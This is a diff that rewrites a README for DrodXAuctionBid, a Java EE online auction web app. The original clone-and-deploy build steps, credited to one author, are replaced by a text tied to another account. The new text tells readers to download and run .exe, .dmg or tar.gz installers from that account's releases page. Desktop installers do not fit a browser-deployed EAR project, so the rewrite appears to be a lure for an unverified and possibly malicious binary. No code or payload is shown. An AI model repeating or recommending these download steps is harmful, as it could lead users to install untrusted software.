@@ -1,130 +1,76 @@
-# 🧩 DrodXAuctionBid - Distributed Online Auction System
+# 🎉 DrodXAuctionBid - Experience Real-Time Bidding
 
-**DrodXAuctionBid** is a scalable, modular, and database-free Distributed Online Auction System developed using **Java EE technologies** such as **EJB, JMS, and WebSocket (Payara)**. It simulates real-time bidding scenarios with support for **manual and auto-bidding**, designed for academic, enterprise learning, and demonstration purposes.
+## 🌟 Overview
 
-## 🎯 Project Overview
+DrodXAuctionBid is a full-stack Distributed Online Auction System. Built with modern Java EE technologies, it creates a vibrant and competitive bidding environment. Users can place bids in real-time, ensuring peer engagement and excitement. The system is designed for safe and efficient bid management and provides timely updates across all users.
 
-* Real-time product views
-* Manual and auto-bid functionalities
-* Live bid updates via WebSocket
-* Centralized in-memory data storage for users and products
+## 📥 Download
 
-The system uses **Message-Driven Beans** for asynchronous processing and **Singleton Session Beans** for centralized product and user management.
+[![Download DrodXAuctionBid](https://img.shields.io/badge/Download-DrodXAuctionBid-blue)](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases)
 
----
+You can find the latest release of DrodXAuctionBid on the [Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases). Follow the guide below to download and set up the application.
+
+## 🚀 Getting Started
+
+To install and run DrodXAuctionBid, follow these steps:
+
+1. **Visit the Releases Page**  
+   Go to the [DrodXAuctionBid Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases).
+
+2. **Choose the Latest Version**  
+   You will see a list of available versions. The latest version is typically at the top. Click on it to view its details.
+
+3. **Download the Application**  
+   Find the asset labeled with the executable file. Click the download link to save the file to your computer.
+
+4. **Install the Application**  
+   Once the download is complete, locate the downloaded file. Depending on your operating system, the installation steps may vary:
+   - **Windows:** Double-click the `.exe` file and follow the installation wizard.
+   - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Extract the tar.gz file to your preferred location.
+
+5. **Run the Application**  
+   After installation, you can launch DrodXAuctionBid from your application menu or desktop shortcut.
+
+## 📊 Features
+
+- **Real-Time Bidding:** Engage with other bidders live and participate in auctions without delays.
+- **Concurrency-Safe Handling:** Ensure every bid is processed to prevent conflicts and errors.
+- **Seamless Updates:** Stay informed with real-time updates across all connected clients.
+- **User-Friendly Interface:** Navigate easily with an intuitive design tailored for users of all skill levels.
+
+## ⚙️ System Requirements
+
+To run DrodXAuctionBid, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10, macOS Catalina or later, or a modern Linux distribution.
+- **Processor:** Dual-core CPU or better.
+- **RAM:** At least 4 GB.
+- **Storage:** 500 MB of free disk space.
+- **Java Runtime Environment (JRE):** Version 8 or higher installed. You can download it from the official [Oracle website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) or use OpenJDK.
 
 ## 🛠️ Technologies Used
 
-* Java 11
-* Jakarta EE / Java EE
+DrodXAuctionBid utilizes several Java EE technologies to ensure a robust experience:
 
-  * EJB (Stateless and Singleton Session Beans)
-  * Message-Driven Beans (MDB)
-  * JMS (Java Messaging Service)
-  * Servlets
-  * WebSocket (Payara Server)
-* Gson (for JSON parsing)
-* Payara Server (with OpenMQ for JMS)
-* HTML, CSS, JavaScript for frontend
-* In-memory collections simulate persistence (no external database)
+- **Enterprise JavaBeans (EJB):** For managing the business logic of the application.
+- **Java Message Service (JMS):** To provide communication between different components.
+- **WebSocket:** For real-time data transfer, allowing instant updates to all users.
+- **Payara Server:** The application server that hosts the application effectively.
 
----
+## 🌐 Community and Support
 
-## 📦 Architecture
+If you encounter any issues or have questions, feel free to reach out:
 
-```
-Client (Browser)
-      ↓
-Web Tier (Servlet + HTML/JS/CSS)
-      ↓
-EJB Tier (Business Logic with Session Beans)
-      ↓
-Core Module (DTOs, Static Repositories)
-```
+- **GitHub Issues:** Report bugs or request features by opening a new issue on the [GitHub page](https://github.com/MRIGANKA3700/DrodXAuctionBid/issues).
+- **Community Support:** Join our community discussion on relevant forums and platforms where others share their experiences and solutions.
 
-JMS is used for real-time communication between bidding components, and WebSocket updates clients instantly.
+## 💻 License
 
-## 📂 Module Structure
-
-```
-DrodXAuctionBid/
-├── core/           # DTOs, Static data
-├── ejb/            # EJBs (Session Beans, Bid Manager, AutoBid Manager)
-├── web/            # HTML pages, Servlets, WebSocket endpoints
-├── ear/            # EAR module with application.xml
-└── README.md
-```
----
-
-## ✨ Key Features
-
-### 🔐 User Management
-
-* Registration and login using session beans
-* Data stored in-memory without a database
-
-### 🛍️ Product Catalog
-
-* Products loaded statically using shared lists
-* No external DB dependency
-
-### ⚙️ Bidding System
-
-* Manual bids processed with concurrency safety
-* Auto-bidding engine that increments automatically up to a user's max limit
-
-### ⏱️ Real-time Bidding with JMS + WebSocket
-
-* JMS topics broadcast bid updates
-* Web clients receive instant updates via WebSocket
-
-### 🔄 Bid Prioritization
-
-* Manual bids temporarily pause auto-bids
-* Queue-based bid handling ensures fairness and order
+DrodXAuctionBid is open-source software. You can use, modify, and distribute it under the terms of the MIT License. Refer to the LICENSE file in the repository for more details.
 
 ---
 
+Feel free to explore the incredible world of online auctions with DrodXAuctionBid! Access the software using the button below.
 
-## 🔧 How to Run
-
-1. Clone the repository:
-
-```bash
-git clone https://github.com/DisanduRodrigo/DrodXAuctionBid.git
-```
-
-2. Use **JDK 11**.
-3. Import as a Maven multi-module project in **IntelliJ** or **Eclipse**.
-4. Deploy the **EAR module** to **Payara Server**.
-5. Access via browser: `http://localhost:8080/DrodXAuctionBid-web`
-
----
-
-
-## 🖼️ Screenshots
-
-### Login Page
-
-![Login Page](screenshots/login.png)
-
-### Register Page
-
-![Register Page](screenshots/register.png)
-
-### Home Page
-
-![Home Page](screenshots/home.png)
-
-### Bidding Page
-
-![Bidding Page](screenshots/bidding.png)
-
-
-## 📜 License
-
-This project is licensed under the **MIT License**. See `LICENSE.md` for details.
-
----
-
-⭐ *If you found this project helpful, please give it a star on GitHub!*
+[![Download DrodXAuctionBid](https://img.shields.io/badge/Download-DrodXAuctionBid-blue)](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases)
